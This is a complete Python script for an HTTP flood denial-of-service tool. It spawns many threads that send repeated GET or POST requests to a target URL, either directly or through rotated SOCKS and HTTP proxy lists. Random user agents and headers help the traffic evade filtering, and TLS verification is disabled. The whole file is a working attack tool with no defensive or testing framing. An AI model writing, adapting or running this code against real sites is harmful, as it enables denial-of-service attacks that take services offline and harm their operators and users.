import threading
import random
import sys
import string
import socks
import socket
import ssl
import argparse
import signal
from time import sleep, time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import queue
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class ProxyManager:
    def __init__(self, proxy_type=None, proxy_file=None):
        self.proxy_queues = {
            'http': queue.Queue(),
            'https': queue.Queue(),
            'socks4': queue.Queue(),
            'socks5': queue.Queue(),
            'direct': queue.Queue()
        }
        self.working_proxies = set()
        self.proxy_type = proxy_type
        self.proxy_file = proxy_file
        if proxy_type and proxy_file:
            self.load_proxies()

    def load_proxies(self):
        """Load proxies from specified file."""
        try:
            with open(self.proxy_file, 'r') as f:
                proxies = f.read().splitlines()
                for proxy in proxies:
                    if proxy.strip():  # Skip empty lines
                        self.proxy_queues[self.proxy_type].put(proxy.strip())
                logger.info(f"Loaded {len(proxies)} {self.proxy_type} proxies from {self.proxy_file}")
        except Exception as e:
            logger.error(f"Error loading proxies from {self.proxy_file}: {e}")

    def get_proxy(self, proxy_type):
        if proxy_type == 'direct':
            return 'direct'
        try:
            proxy = self.proxy_queues[proxy_type].get_nowait()
            return proxy
        except queue.Empty:
            if len(self.working_proxies) > 0:
                proxy = random.choice(list(self.working_proxies))
                return proxy
            return None

    def mark_proxy_working(self, proxy):
        if proxy != 'direct':
            self.working_proxies.add(proxy)

class RequestManager:
    def __init__(self, url, proxy_type, http_mode):
        self.url = url
        self.proxy_type = proxy_type
        self.http_mode = http_mode
        self.parsed_url = urlparse(url)
        self.port = 443 if self.parsed_url.scheme == 'https' else 80
        self.use_ssl = self.parsed_url.scheme == 'https'
        
    def get_random_ua(self):
        with open('default/useragents.txt') as f:
            user_agents = [line.strip() for line in f if line.strip()]
        return random.choice(user_agents)

    def get_random_accept(self):
        accepts = [
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "application/json, text/javascript, */*; q=0.01",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
        ]
        return random.choice(accepts)

    def create_socket_connection(self, proxy_host, proxy_port):
        if self.proxy_type in ['socks4', 'socks5']:
            sock = socks.socksocket()
            if self.proxy_type == 'socks4':
                sock.set_proxy(socks.SOCKS4, proxy_host, int(proxy_port))
            else:
                sock.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
                
            # Set aggressive timeouts
            sock.settimeout(5)
            
            # Connect to the target server
            try:
                sock.connect((self.parsed_url.hostname, self.port))
            except Exception as e:
                logger.error(f"Failed to connect through {self.proxy_type}: {e}")
                raise

            # Wrap socket with SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                try:
                    sock = context.wrap_socket(sock, server_hostname=self.parsed_url.hostname)
                except Exception as e:
                    logger.error(f"SSL wrapping failed: {e}")
                    raise
                
            return sock
        else:
            # Handle HTTP/HTTPS proxies
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            try:
                sock.connect((proxy_host, int(proxy_port)))
            except Exception as e:
                logger.error(f"Failed to connect to proxy: {e}")
                raise

            if self.use_ssl:
                connect_str = f"CONNECT {self.parsed_url.hostname}:{self.port} HTTP/1.1\r\n"
                connect_str += f"Host: {self.parsed_url.hostname}:{self.port}\r\n\r\n"
                sock.send(connect_str.encode())
                
                response = sock.recv(4096)
                if not response.startswith(b"HTTP/1.1 200") and not response.startswith(b"HTTP/1.0 200"):
                    raise Exception("Proxy connection failed")

                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.parsed_url.hostname)
                
            return sock

    def send_request(self, sock):
        path = self.parsed_url.path
        if not path:
            path = "/"
        if self.parsed_url.query:
            path += "?" + self.parsed_url.query

        headers = []
        if self.http_mode == "get":
            headers.append(f"GET {path} HTTP/1.1")
        else:
            headers.append(f"POST {path} HTTP/1.1")
            data = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
            headers.append(f"Content-Length: {len(data)}")
            headers.append("Content-Type: application/x-www-form-urlencoded")

        headers.extend([
            f"Host: {self.parsed_url.hostname}",
            f"User-Agent: {self.get_random_ua()}",
            f"Accept: {self.get_random_accept()}",
            "Connection: keep-alive",
            "\r\n"
        ])

        request = "\r\n".join(headers)
        sock.send(request.encode())
        
        if self.http_mode == "post":
            sock.send(data.encode())

class Flooder:
    def __init__(self, url, proxy_type, num_threads, http_mode, proxy_file=None):
        self.proxy_manager = ProxyManager(proxy_type, proxy_file)
        self.request_manager = RequestManager(url, proxy_type, http_mode)
        self.num_threads = int(num_threads)
        self.proxy_type = proxy_type
        self.running = True
        self.request_count = 0
        self.success_count = 0
        self.lock = threading.Lock()
        self.start_time = None
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        self.running = False
        if self.start_time:
            runtime = time() - self.start_time
            rps = self.request_count / runtime if runtime > 0 else 0
            success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
            
            print("\n=== Statistics ===")
            print(f"Total Requests: {self.request_count}")
            print(f"Successful Requests: {self.success_count}")
            print(f"Success Rate: {success_rate:.2f}%")
            print(f"Requests per Second: {rps:.2f}")
            print(f"Total Runtime: {runtime:.2f} seconds")
        sys.exit(0)

    def flood_worker(self):
        while self.running:
            proxy = self.proxy_manager.get_proxy(self.proxy_type)
            if not proxy:
                logger.error("No proxies available")
                sleep(1)
                continue

            try:
                if proxy == 'direct':
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((self.request_manager.parsed_url.hostname, self.request_manager.port))
                    if self.request_manager.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.request_manager.parsed_url.hostname)
                else:
                    proxy_host, proxy_port = proxy.split(':')
                    sock = self.request_manager.create_socket_connection(proxy_host, proxy_port)
                
                # Send multiple requests through the same connection
                for _ in range(100):  # Number of requests per connection
                    if not self.running:
                        break
                    
                    try:
                        self.request_manager.send_request(sock)
                        with self.lock:
                            self.request_count += 1
                            self.success_count += 1
                        self.proxy_manager.mark_proxy_working(proxy)
                        #logger.info(f"Request successful via {proxy} | {self.proxy_type}")
                        if proxy != 'direct':
                            sleep(0.05)  # Small delay between requests
                    except Exception as e:
                        logger.error(f"Request failed: {e}")
                        break

                sock.close()
            except Exception as e:
                logger.error(f"Connection failed for {proxy}: {e}")
                sleep(0.5)

    def start(self):
        logger.info(f"Starting flooder with {self.num_threads} threads")
        self.start_time = time()
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.flood_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)

        try:
            while True:
                sleep(1)
                logger.info(f"Total requests: {self.request_count}, Successful: {self.success_count}")
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            self.running = False
            for thread in threads:
                thread.join()

def main():
    parser = argparse.ArgumentParser(description='Flooder')
    parser.add_argument('url', type=str, help='Target URL')
    parser.add_argument('threads', type=int, help='Number of threads')
    parser.add_argument('http_mode', type=str, help='HTTP mode (get, post)')
    parser.add_argument('--proxy-type', type=str, default='direct',
                      choices=['http', 'https', 'socks4', 'socks5', 'direct'],
                      help='Proxy type (default: direct)')
    parser.add_argument('--proxy-file', type=str, help='Proxy file path (required if proxy-type is not direct)')
    args = parser.parse_args()

    if args.http_mode not in ['get', 'post']:
        print("Invalid HTTP mode. Use get or post")
        sys.exit(1)

    if args.proxy_type != 'direct' and not args.proxy_file:
        print("Error: --proxy-file is required when using a proxy")
        sys.exit(1)

    if args.proxy_type == 'direct' and args.proxy_file:
        print("Cannot specify proxy file with direct proxy type")
        sys.exit(1)

    flooder = Flooder(args.url, args.proxy_type, args.threads, args.http_mode, args.proxy_file)
    flooder.start()

if __name__ == '__main__':
    main()